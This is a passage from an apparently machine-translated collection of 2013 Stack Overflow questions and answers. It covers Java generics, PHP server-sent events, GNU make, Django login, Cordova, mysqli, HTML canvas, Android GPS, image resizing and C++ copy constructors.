  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable

BSTree.java:42: error: name clash: remove(T#1) in BSTree and remove(T#2) in Tree have the same erasure, yet neither overrides the other
    public void remove(T key) throws NullPointerException, TreeException {
                ^
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Comparable<T#2> declared in class Tree

BSTree.java:49: error: method compareTo in interface Comparable<T#2> cannot be applied     to given types;
            if (key.compareTo(ptr.key) == 0) {
                   ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable

BSTree.java:81: error: method compareTo in interface Comparable<T#2> cannot be applied to given types;
            else if (key.compareTo(ptr.key) < 0) ptr = ptr.left;
                        ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable

BSTree.java:89: error: name clash: search(T#1) in BSTree and search(T#2) in Tree have     the same erasure, yet neither overrides the other
    public Node<T> search(T key) throws NullPointerException, KeyNotStoredException {
                   ^
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Comparable<T#2> declared in class Tree

BSTree.java:94: error: method compareTo in interface Comparable<T#2> cannot be applied to given types;
            if (key.compareTo(ptr.key) == 0) return ptr;
                   ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable

BSTree.java:95: error: method compareTo in interface Comparable<T#2> cannot be applied to given types;
            else if (key.compareTo(ptr.key) < 0) ptr = ptr.left;
                    ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable 
```

看起来Java认为对象是不同类型的......如何解决这个问题？

这是我的一段代码：

**树.java**

```
class Node<T extends Comparable<T>> {

    protected T key;
    protected Node parent, left, right;

    public Node(T key, Node parent) {
        this.key = key;
        this.parent = parent;
        this.left = null;
        this.right = null;
    }

}

public abstract class Tree<T extends Comparable<T>> {
    protected Node<T> root;
protected Integer nodesCount;

    public abstract void add(T key) throws NullPointerException;

    public abstract void remove(T key) throws NullPointerException, TreeException;

    public abstract Node<T> search(T key) throws NullPointerException, KeyNotStoredException;
} 
```

**BSTree.java**

```
public class BSTree<T extends Comparable<T>> extends Tree {

    public BSTree() {
        root = null;
        nodesCount = new Integer(0);
    }

    @Override
    public void add(T key) throws NullPointerException {
        if (root == null) root = new Node<T>(key, null);    
        else {      
            boolean left = false;
            Node ptr = root, parent = ptr.parent;
            while (ptr != null) {
                parent = ptr;
                left = false;
                if (key.compareTo(ptr.key) == -1) {
                    ptr = ptr.left;
                    left = true;
                } else ptr = ptr.right;
            }

            if (left) parent.left = new Node<T>(key, parent);
            else parent.right = new Node<T>(key, parent);
        }

        nodesCount++;
    }

    @Override
    public void remove(T key) throws NullPointerException, TreeException {
        /* implementation */
    }

    @Override
    public Node<T> search(T key) throws NullPointerException, KeyNotStoredException {
        /* implementation */
    }

} 
```

编辑：感谢您的建议，我能够将错误数量减少到 5 个。它们是：javac -d ../bin *.java

```
BSTree.java:28: error: method compareTo in interface Comparable<T#2> cannot be applied to given types;
                if (key.compareTo(ptr.key) == -1) {
                       ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable

BSTree.java:49: error: method compareTo in interface Comparable<T#2> cannot be applied to given types;
            if (key.compareTo(ptr.key) == 0) {
               ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable

BSTree.java:81: error: method compareTo in interface Comparable<T#2> cannot be applied to given types;
            else if (key.compareTo(ptr.key) < 0) ptr = ptr.left;
                        ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation     conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable

BSTree.java:94: error: method compareTo in interface Comparable<T#2> cannot be applied to given types;
            if (key.compareTo(ptr.key) == 0) return ptr;
                   ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable

BSTree.java:95: error: method compareTo in interface Comparable<T#2> cannot be applied to given types;
            else if (key.compareTo(ptr.key) < 0) ptr = ptr.left;
                        ^
  required: T#1
  found: Comparable
  reason: actual argument Comparable cannot be converted to T#1 by method invocation conversion
  where T#1,T#2 are type-variables:
    T#1 extends Comparable<T#1> declared in class BSTree
    T#2 extends Object declared in interface Comparable 
```

现在，我的代码有它`Node<T>`并且`Tree<T>`缺少它。但是还有什么问题？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T15:14:58.683

当您在 JDK 中复制功能时，您应该阅读代码以获得一些想法。

你的代码需要让你使用 Node 和 Tree 通用的一件事。

```
 public class BSTree<T extends Comparable<T>> extends Tree<T> { 
```

和

```
protected Node<T> parent, left, right; 
```

顺便说一句：当您可以使用原语时，您不应该使用包装器。

```
protected int nodesCount; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:14:07.763

您在声明中缺少通用`Tree`参数`BSTree`：

```
public class BSTree<T ...> extends Tree<T> 
```

这意味着`add(T)`in 方法`BSTree`不会按`Tree`原样覆盖 in 方法，因为它们没有相同的参数类型。

然而，由于`T` *一个类*并不比一个更精确`Object`（我们只知道它实现了`Comparable` *接口*），因此这两种方法都具有与 相同的擦除`add(Object)`，具有潜在不兼容的类型（在编译器的错误输出中标识为`T#1`和`T#2`）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:14:08.097

尝试：

```
public class BSTree<T extends Comparable<T>> extends Tree<T> { 
```

# javascript - 实施 SSE/EventSource 的正确方法？

> ID：14111537
> 
> 赞同：2
> 
> 时间：2013-01-01T15:10:00.530
> 
> 标签：javascript, html, server-sent-events

我在网上看到了作者设置的教程，`SSE/EventSource`并且在服务器 PHP 脚本中回显了一些数据，然后调用`ob_flush()`并将`flush()`数据发送回客户端浏览器。这工作正常，新数据每 3 秒被推送到客户端。

但我也读到有人说这是使用 SSE 的错误方法。这个人说，SSE的全部意义在于服务器应该保持连接，而使用上述方法将新数据推送到客户端的原因是因为EventSource实现了服务器断开连接。这个人说服务器应该使用循环并通过使用睡眠每隔几秒钟将数据推送出去。

那么，是这样的吗？**SSE 是否应该通过在服务器上设置一个循环**并推送数据来实现，`sleep()`用于调整推送的速度？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T19:14:37.550

我不太了解 PHP 是否`sleep()`是唯一的方法，但是服务器端的重点是保持连接打开，以便可以随时将新数据发送到客户端而无需打开新连接。

这有一些皱纹。由于 SSE 旨在与传统的共享网络托管一起使用，因此预计服务器端会在某个时间点超时（30 秒或 60 秒，在 PHP 中取决于[`max_execution_time`](http://php.net/manual/en/info.configuration.php)和/或[`set_time_limit()`](http://php.net/manual/en/function.set-time-limit.php)）。这会导致第二个问题，因为服务器预计会定期断开连接，浏览器预计会自动[重新建立连接](http://www.whatwg.org/specs/web-apps/current-work/multipage/comms.html#reestablish-the-connection)，这解释了您提到的博客文章中看到的行为 - 浏览器会自动重新连接，因此看起来好像 SSE 正在工作。

我认为`sleep()`你失去了一些[实时](http://en.wikipedia.org/wiki/Real-time_web)方面，就好像你每秒只发送数据一样，你不妨使用 AJAX 轮询，但我知道 PHP 中没有比循环/睡眠方法更好的方法了。此外，如果您将 PHP 用于 SSE，请记住会话对象是单线程的，因此如果您在 SSE 页面中将其保持打开状态，它将阻止任何其他需要访问的脚本（例如 AJAX 请求）。

# makefile - Makefile：变量赋值中的奇怪行为

> ID：14111538
> 
> 赞同：1
> 
> 时间：2013-01-01T15:10:29.263
> 
> 标签：makefile, variable-assignment

考虑这个小的 Makefile：

```
test:   var ?= foo

test:
        echo $(var) 
```

make的文档说`?=`分配了一个以前没有分配过的变量（未定义）。但如果通过命令行分配：

```
make var=1234 
```

一些随机（ASCII、非 ASCII、仅空白）字符而不是`1234`打印到终端。使用`=`而不是`?=`按预期工作，但在我的情况下不能使用，因为它覆盖了“继承”，从调用 make 导出的分配。此外，如果不使用基于目标但全局分配，则输出符合预期。这些字符序列来自哪里？

在 linux gentoo (GNU make v3.82) 和 deb-wheezy (GNU make v3.81) 上测试。

感谢您的提示！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T17:27:36.237

我可以用 GNU Make 3.81 重现该问题，但请注意，它仅在您`var`在命令行上设置时发生（根据`make`的术语）。如果`var`的值来自环境，例如使用以下命令：

```
var=1234 make test 
```

然后一切正常。这对我来说有点像 make 的错误，特别是考虑到以下公式（根据我对手册第 6.5 和 6.11 节的理解，它应该等同于您原来的 Makefile）：

```
test: var:=$(if $(findstring undefined,$(origin var)),foo,$(var))

test:
        echo $(var) 
```

在所有情况下都能正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-27T19:45:22.217

这确实是 GNU make 的一个错误。这个问题出现在 3.81 甚至 3.82 中。出于某种原因，许多系统仍在使用 3.81（即 2013-oct-27）。奇怪的是，该错误仅存在于 Linux 上。在使用 make 3.81 的 MacOS 上，该错误不会出现。

使用 GIT 提交 ae2ab76fac（GNU make）问题得到解决，现在行为符合预期。

Savannah bug #31743 也有一些有趣的地方，它描述了这个问题。当 Savannah 遭到入侵时，那个人迷路了。错误编号现在分配给其他东西。见[http://lists.gnu.org/archive/html/bug-make/2010-12/msg00009.html](http://lists.gnu.org/archive/html/bug-make/2010-12/msg00009.html)

# python - Django：登录只需要 1 个参数（给定 2 个）

> ID：14111539
> 
> 赞同：0
> 
> 时间：2013-01-01T15:10:32.540
> 
> 标签：python, django

我最近试图回到 Django，但在尝试制作登录页面进行练习时遇到了一些问题。我收到错误“登录只需要 1 个参数（给定 2 个）”，我不知道为什么。这是我的views.py：

```
from django.shortcuts import render_to_response
from django.contrib.auth import authenticate, login
from django.template import RequestContext

def login(request):
    state = "Please log in below..."
    username = password = ''
    if request.POST:
        username = request.POST.get('username')
        password = request.POST.get('password')

        user = authenticate(username=username, password=password)
        if user is not None:
            if user.is_active:
                login(request, user)
                state = "You're successfully logged in!"
            else:
                state = "Your account is not active, please contact the site admin."
        else:
            state = "Your username and/or password were incorrect."

    return render_to_response('login.html',{'state':state, 'username': username},context_instance=RequestContext(request)) 
```

这是我的 login.html 模板：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Log in</title>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<style>
body{
    font-family:Arial,Helvetica,sans-serif;
    font-size: 12px;
}
</style>
</head>
<body>
    {{ state }}
    <form action="/login/" method="post">
        {% csrf_token %}
        {% if next %}
        <input type="hidden" name="next" value="{{ next }}" />
        {% endif %}
        Username:
        <input type="text" name="username" value="{{ username }}" /><br />
        Password:
        <input type="password" name="password" value="" /><br />

        <input type="submit" value="Log In" />
    </form>
</body>
</html> 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-01T16:27:17.467

您应该将视图的名称从更改为其他名称`login`，例如`login_view`，因为您当前尝试递归调用它，而不是调用`django.contrib.auth.login`

# android - phonegap / cordova android 已安装应用程序列表

> ID：14111543
> 
> 赞同：4
> 
> 时间：2013-01-01T15:11:01.450
> 
> 标签：android, cordova

我正在使用cordova 2.2 创建一个android 应用程序。我想创建一个 html 页面，在该页面中，使用 javascript，有设备中已安装应用程序的列表。我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:58:50.833

我不相信 Cordova API 可以为您提供这些信息。正如 CommonsWare 指出的那样，您将需要一个插件来获取此信息。这是如何获取已安装应用程序列表的链接。

[如何获取已安装的 android 应用程序列表并选择一个运行](https://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run)

这是一个用于创建 Android 插件的[链接](http://www.adobe.com/devnet/html5/articles/extending-phonegap-with-native-plugins-for-android.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-10-14T15:05:24.527

有这个插件可以提供你正在寻找的东西： [https ://github.com/weelion/phonegap-plugin-installed-apps](https://github.com/weelion/phonegap-plugin-installed-apps)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-04-03T01:49:54.653

你现在可以使用[cordova-plugin-intent-list](https://github.com/nick-denry/cordova-plugin-intent-list)。要获取带有图标的已安装应用程序列表：

```
navigator.IntentList.getList(function(applist) {
    console.log(applist);
}, function(errorMesssage) {
    console.log(errorMesage);
}); 
```

`applist`将包含：

```
{
    "label": "Chrome",
    "package": "com.android.chrome",
    "packageIcon": "data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAJAAAACQ..."
},
... 
```

# php - Whis 更快 - 使用 mysqli 准备语句/仅使用 mysqli 获取数组

> ID：14111545
> 
> 赞同：0
> 
> 时间：2013-01-01T15:11:12.557
> 
> 标签：php, mysqli, prepared-statement

哪个更快？使用 mysqli 准备好的语句获取数组：

```
 $statement=$mysqli->prepare("SELECT `name`,`age` FROM `users` WHERE `id`=?");
    $statement->bind_param('i',$id);
    $statement->execute();
    $statement->bind_result($array['0'],$array['1']);
    $statement->fetch();
    return $array; 
```

或仅使用 mysqli 获取数组：

```
return $mysqli->query("SELECT `name`,`age`FROM `users` WHERE `id`='".$id."'")->fetch_row(); 
```

编辑：**只使用准备好的语句，因为普通查询是不安全的！不用担心性能 - 担心安全！**

EDIT2：**最近我开始使用 PDO 而不是 MySQLi。PDO 在很多方面都优于 MySQLi 扩展。其中之一是通过多维数组获取和循环。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:12:38.183

两者之间的性能应该是微不足道的。但是，您不应该担心这一点。您准备好的声明更加安全。

`$id`如果来自任何用户输入（查询字符串、表单等），您的直接查询将允许所谓的 SQL 注入攻击。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T15:14:41.757

有一个严格的规则：只有在你有充分理由的情况下才会用性能问题来打扰自己。
否则你要么只是浪费你的时间，甚至让事情变得更糟。

在您的特定情况下，即使存在差异，也几乎不会引起注意。
所以，它的正确设计应该是你关心的，而不是可以想象的“性能问题”。

# api - 使用 YouTube 上传小部件进行身份验证

> ID：14111547
> 
> 赞同：1
> 
> 时间：2013-01-01T15:11:14.827
> 
> 标签：api, upload, youtube, widget, oauth-2.0

当使用 YouTube API 第 2 版从我们的网站上传学生视频时，我们可以选择使用上传 html 表单或使用“测试版”YouTube 上传小部件进行上传。上传小部件允许用户直接从网络摄像头录制到 Youtube。（我猜它实际上是 YouTube API 版本 3 的一部分。）

当我们使用 HTML 表单上传时，我们可以通过 authsub 或 oauth2 对用户服务器端进行身份验证，并请求我们添加到 HTML 表单中的令牌。然而，上传小部件似乎总是要求用户通过小部件生成的一个小弹出窗口登录到 YouTube。它不使用 oauth2 或 authsub。

有没有办法使用生成令牌的服务器端来避免用户必须使用小弹出窗口登录？

# javascript - 为什么画布圆圈看起来不像圆圈？

> ID：14111548
> 
> 赞同：1
> 
> 时间：2013-01-01T15:11:28.687
> 
> 标签：javascript, html5-canvas

我有一个非常简单的代码应该画一个圆，但它看起来不像一个，而且不在正确的位置坐标都有些偏移。画布设置为`style="width: 600px; height: 600px;"`。我在 chrome 和 safari 上尝试过 - 看起来一样，所以它不是浏览器错误。所以我的问题是（两者可能都有一个答案）：

1.  如果我将中心放在 (100, 100) 处，为什么圆圈与左边界的距离不相等，它与上边界的距离不相等？
2.  为什么 (300, 300) 点在画布之外，而不是在中心？

编码：

```
var context = document.getElementById('c').getContext("2d");
context.fillStyle = 'black';
context.fill();
context.beginPath();
context.arc(100, 100, 30, 0, 2 * Math.PI, true);
context.stroke(); 
```

它的外观： ![在此处输入图像描述](../Images/3f2481c4566ecca047bbefd0ddc6612c.png)

# 编辑

根据评论，我发现写作`<canvas id="myCanvas" style="width: 578px; height: 200px;"></canvas>`导致了这个问题，写作`<canvas id="myCanvas" width="578" height="200"></canvas>`解决了这个问题。有谁知道为什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T15:28:55.903

这记录在[HTML5 Canvas 规范](http://www.whatwg.org/specs/web-apps/current-work/multipage/the-canvas-element.html#attr-canvas-width)中。

*HTML 属性* `width="x" height="y"`描述画布的绘图*区域*，默认为`300 × 150 px`. 作为副作用，它们描述了画布的默认可见大小。

在画布上设置的*CSS 属性* `width: x; height: y;`可以拉伸/压缩该绘图区域，但它们不会更改其大小。

在您的情况下，浏览器会拉伸默认绘图区域 ( `300 × 150 px`) 以满足`600 × 600 px`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T15:19:09.607

这个例子展示了如何在画布上画一个圆圈：http: [//www.html5canvastutorials.com/tutorials/html5-canvas-circles/](http://www.html5canvastutorials.com/tutorials/html5-canvas-circles/)

此外，您需要在 canvas 元素上设置`width`and属性，而不是像这样的属性：`height``style`

```
<canvas id="c" width="600" height="600" style="background-color:yellow;"></canvas> 
```

# android - Android GPS 不显示或写入文件

> ID：14111550
> 
> 赞同：1
> 
> 时间：2013-01-01T15:11:33.283
> 
> 标签：android, android-layout

我有一个监控加速度计和 GPS 并将它们输出到文件中的应用程序。

我已默认 GPS 为 0,0。但它似乎没有改变。

```
public String location = "0 , 0";

    public void onLocationChanged(Location arg0) {
        arg0.getLatitude();
    arg0.getLongitude();
    location = arg0.getLongitude() + "," + arg0.getLatitude();

    locationText = TextView.class.cast(location);
    } 
```

文本视图可以显示它是否正在发生变化，但这似乎也没有更新。

![应用截图](../Images/1d8e8c18d79f5285b32cbfa79f86e6f6.png)

位置文本视图位于屏幕顶部。

我不确定我还能包括什么来帮助您帮助我。但如果有什么让我知道。

```
LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0, this); 
```

这是加速度计的代码，它有效，而 GPS 无效。

![Java 代码](../Images/661b4427f6ffd37fcfc8d2a4fd1cd7aa.png)

谢谢你，新年快乐。

**代码**

```
public class AccelOrientExample extends Activity implements SensorEventListener, LocationListener {

// Accelerometer X, Y, and Z values
private TextView accelXValue;
private TextView accelYValue;
private TextView accelZValue;

// Orientation X, Y, and Z values
private TextView orientXValue;
private TextView orientYValue;
private TextView orientZValue;

private TextView locationText;
private TextView toWrite;

public Toast myToast;
public String accel;
public int counter = 0;
public String orientData;

private LocationManager lm;
private Toast loc;
public String location = "0 , 0";

private SensorManager sensorManager = null;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // Get a reference to a SensorManager
    sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
    setContentView(R.layout.main);

    // Capture accelerometer related view elements
    accelXValue = (TextView) findViewById(R.id.accel_x_value);
    accelYValue = (TextView) findViewById(R.id.accel_y_value);
    accelZValue = (TextView) findViewById(R.id.accel_z_value);

    // Capture orientation related view elements
    orientXValue = (TextView) findViewById(R.id.orient_x_value);
    orientYValue = (TextView) findViewById(R.id.orient_y_value);
    orientZValue = (TextView) findViewById(R.id.orient_z_value);

    // Initialize accelerometer related view elements
    accelXValue.setText("0.00");
    accelYValue.setText("0.00");
    accelZValue.setText("0.00");

    // Initialize orientation related view elements
    orientXValue.setText("0.00");
    orientYValue.setText("0.00");
    orientZValue.setText("0.00");

    LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, this);

}

/**/

// This method will update the UI on new sensor events
public void onSensorChanged(SensorEvent sensorEvent) {
    synchronized (this) { 
        while(counter < 15)
        {
            if (sensorEvent.sensor.getType() == Sensor.TYPE_ORIENTATION)
            {
                orientXValue.setText(Float.toString(sensorEvent.values[0]));
                orientYValue.setText(Float.toString(sensorEvent.values[1]));
                orientZValue.setText(Float.toString(sensorEvent.values[2]));
            }
            MyFile file = new MyFile();
            file.createFile("OrientData.txt");

            orientData = sensorEvent.values[0] + "," + sensorEvent.values[1] + "," + sensorEvent.values[2] + "\n";

            file.write(orientData);
            counter ++;
        }
        if (sensorEvent.sensor.getType() == Sensor.TYPE_ACCELEROMETER)
        {
            accelXValue.setText(Float.toString(sensorEvent.values[0]));
            accelYValue.setText(Float.toString(sensorEvent.values[1]));
            accelZValue.setText(Float.toString(sensorEvent.values[2]));

            accel = sensorEvent.values[0] + "," + sensorEvent.values[1] + "," + sensorEvent.values[2] + ",";
        }

    }
}

public void onLocationChanged(Location arg0) {
    synchronized (this) {
    lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
    arg0.getLatitude();
    arg0.getLongitude();
    location = arg0.getLongitude() + "," + arg0.getLatitude();
    Toast.makeText(getApplicationContext(),"Test",Toast.LENGTH_LONG).show();
    runOnUiThread(new Runnable(){

            public void run() {
                locationText.setText(location);
            }

        });
    }
}

    public void FileLogger(String accel, String location)
    {
        MyFile file = new MyFile();
        file.createFile("RoadData.txt");

        String toWrite = accel + location + "\n";
        file.write(toWrite);
    }

public void onAccuracyChanged(Sensor arg0, int arg1) {
    // TODO Auto-generated method stub
}

public void onProviderDisabled(String arg0) {
    Log.e("GPS", "provider disabled " + arg0);
}

public void onProviderEnabled(String arg0) {
    Log.e("GPS", "provider enabled " + arg0);
}

public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
    Log.e("GPS", "status changed to " + arg0 + " [" + arg1 + "]");
}

@Override
protected void onResume() {
    super.onResume();
    // Register this class as a listener for the accelerometer sensor
    sensorManager.registerListener(this,
            sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER),
            SensorManager.SENSOR_DELAY_NORMAL);
    // ...and the orientation sensor
    sensorManager.registerListener(this,
            sensorManager.getDefaultSensor(Sensor.TYPE_ORIENTATION),
            SensorManager.SENSOR_DELAY_NORMAL);
}

@Override
protected void onStop() {
    // Unregister the listener
    sensorManager.unregisterListener(this);
    super.onStop();
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T00:05:50.260

尝试先启动谷歌地图，让它精确定位您的当前位置。有时 Location 返回 null 因为最近的位置列表已被清除。还可以尝试这种方法来迭代当前启用的提供程序，而不仅仅是最好的提供程序。这使您有更高的机会或返回一些坐标。希望这对人有所帮助。祝你好运

```
private Location getLastKnownLocation() {
List<String> providers = mLocationManager.getProviders(true);
Location bestLocation = null;
for (String provider : providers) {
    Location l = mLocationManager.getLastKnownLocation(provider);
    ALog.d("last known location, provider: %s, location: %s", provider,
            l);

    if (l == null) {
        continue;
    }
    if (bestLocation == null
            || l.getAccuracy() < bestLocation.getAccuracy()) {
        ALog.d("found best last known location: %s", l);
        bestLocation = l;
    }
}
if (bestLocation == null) {
    return null;
}
return bestLocation; 
```

}

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:21:08.950

你可以试试下面

```
locationText.setText(location); 
```

代替

```
locationText = TextView.class.cast(location); 
```

我希望 locationText 是一个 TextView 和

您正确请求了位置更新，并且

在清单中正确添加了权限，并且

位置更新代码没有被非 ui 线程执行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-03T14:54:31.480

您可能关闭了位置服务，请检查该提供商是否首先可用；

```
locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) 
```

就像@Javantor 所说，您需要确保清单包括；

```
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /> 
```

并且您正在更新 UI 线程。尝试将其放入 onLocationUpdated 代码中；

```
 runOnUiThread(new Runnable(){

            @Override
            public void run() {
                locationText.setText(location);
            }

        }); 
```

虽然它不应该有所作为，但以这种方式请求 LocationManager；

```
lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, this); 
```

将时间设置为 0 而不是 1000 毫秒可确保您尽快获得更新。

您可以在 onLocationChanged 方法中添加一些日志记录吗？这将让您知道是否正在接收 GPS 数据。

# c# - 计算尺寸以调整图像大小

> ID：14111552
> 
> 赞同：2
> 
> 时间：2013-01-01T15:12:14.240
> 
> 标签：c#, image-resizing, dimensions

我正在创建一个图像调整器方法以使图像适合最大尺寸（最大宽度和最大高度）。我正在使用以下方法来计算目标尺寸。如果宽度大于最大宽度，我将宽度设置为最大宽度并计算高度，然后使用这个简单的数学公式对高度再次执行此操作：

> （宽度/高度）=（最大宽度/最大高度）

但是，调整大小的图像在调整大小时似乎没有正确的尺寸。我的方法是这样的：

```
private static Size CalculateDimensions(Size currentSize, double maxWidth, double maxHeight) {            
    double width = currentSize.Width,
           height = currentSize.Height;
    if (width > maxWidth) {
        width = maxWidth;
        height = width * maxHeight / maxWidth;
    }
    if (height > maxHeight) {
        height = maxHeight;
        width = height * maxWidth / maxHeight;
    }
    return new Size(Convert.ToInt32(width), Convert.ToInt32(height));   
} 
```

你能告诉我我哪里错了吗？为什么这不起作用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:28:01.697

不要使用 和 的比例，`maxWidth`而是`maxHeight`使用原始`width`和的比例`height`。

您当前正在计算的是最大尺寸图像的纵横比，它将是一个常数，并且与原始图像的纵横比不同。

您需要类似以下代码的内容：

```
if (width > maxWidth)
{
    double ratio = height / width;
    width = maxWidth;
    height = width * ratio;
}
if (height > maxHeight)
{
    double ratio = width / height;
    height = maxHeight;
    width = height * ratio;
} 
```

您可能还可以对代码进行其他优化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T15:24:32.680

检查您的最大高度和最大宽度是否始终与图像尺寸成正比。因为要使您的公式正常工作，当前大小必须始终与最大大小成正比。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:27:42.750

```
private static Size CalculateDimensions(Size currentSize, double maxWidth, double maxHeight) {
    var sourceWidth = (double)currentSize.Width;
    var sourceHeight = (double)currentSize.Height;

    var widthPercent = maxWidth / sourceWidth;
    var heightPercent = maxHeight / sourceHeight;

    var percent = heightPercent < widthPercent
                   ? heightPercent
                   : widthPercent;

    var destWidth = (int)(sourceWidth * percent);
    var destHeight = (int)(sourceHeight * percent);

    return new Size(destWidth, destHeight);
} 
```

# c++ - 为什么在程序中调用这个复制构造函数？

> ID：14111563
> 
> 赞同：0
> 
> 时间：2013-01-01T15:14:10.603
> 
> 标签：c++

```
#include <iostream>
#include <string.h>

using namespace std;

class withCC
{
public:
    withCC() {}
    withCC(const withCC&) {
        cout<<"withCC(withCC&)"<<endl;
    }
};

class woCC
{
    enum {bsz = 100};
    char buf[bsz];
public:
    woCC(const char* msg = 0) {
        memset(buf, 0, bsz);
        if(msg) strncpy(buf, msg, bsz);
    }
    void print(const char* msg = 0)const {
        if(msg) cout<<msg<<":";
        cout<<buf<<endl;
    }
};

class composite
{
    withCC WITHCC;
    woCC WOCC;
public:
    composite() : WOCC("composite()") {}
    void print(const char* msg = 0) {
        cout<<"in composite:"<<endl;
        WOCC.print(msg);
    }
};

int main()
{
    composite c;
    c.print("contents of c");
    cout<<"calling composite copy-constructor"<<endl;
    composite c2 = c;
    c2.print("contents of c2");
} 
```

运行结果如下：

```
$ ./a.out 
in composite:
contents of c:composite()
calling composite copy-constructor
withCC(withCC&)
in composite:
contents of c2:composite() 
```

而且我不明白为什么`withCC(withCC&)`作为输出的一部分给出。我猜`composite c2 = c;`会导致执行复制构造函数。但是如下图，`WITHCC`是的一部分`class composite`，为什么会调用它来处理这个拷贝构造函数呢？谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-01T15:21:39.277

复制构造函数`withCC(withCC&)`被调用是因为它的默认复制构造函数`composite`将调用其成员数据的所有复制构造函数。并且由于您有一个`withCC`对象作为类中的成员数据，因此调用`composite`了复制构造函数。`withCC(withCC&)`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T15:22:26.173

复制构造函数被调用

*   当实例化一个对象并用另一个对象的值初始化它时，或者
*   每当您通过值将对象作为参数传递给函数或
*   从函数中按值返回对象

类的默认复制构造函数`composite`将调用其成员的复制构造函数，这就是`withCC(withCC&)`打印的原因。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T15:35:05.613

语句**复合 c2 = c;** 将尝试通过**复制构造函数**复制对象，但类**复合**没有用户定义的复制构造函数，因此将在您的情况下使用编译器的默认复制构造函数。并且您还想通过创建**复合材料来构造****WOCC**对象，因此对于**WOCC**构造，**用户定义 with cc 的复制构造函数**被调用

# apache-poi - Excel 发现无法读取的内容 -POI XSSFWorkbook setcellvalue

> ID：14111564
> 
> 赞同：4
> 
> 时间：2013-01-01T15:14:14.223
> 
> 标签：apache-poi

我正在尝试为 xlsx 文件设置单元格值，程序可以正常工作，没有错误，但是在打开 xlsx 文件时会引发错误，提示 Excel 发现不可读的内容

```
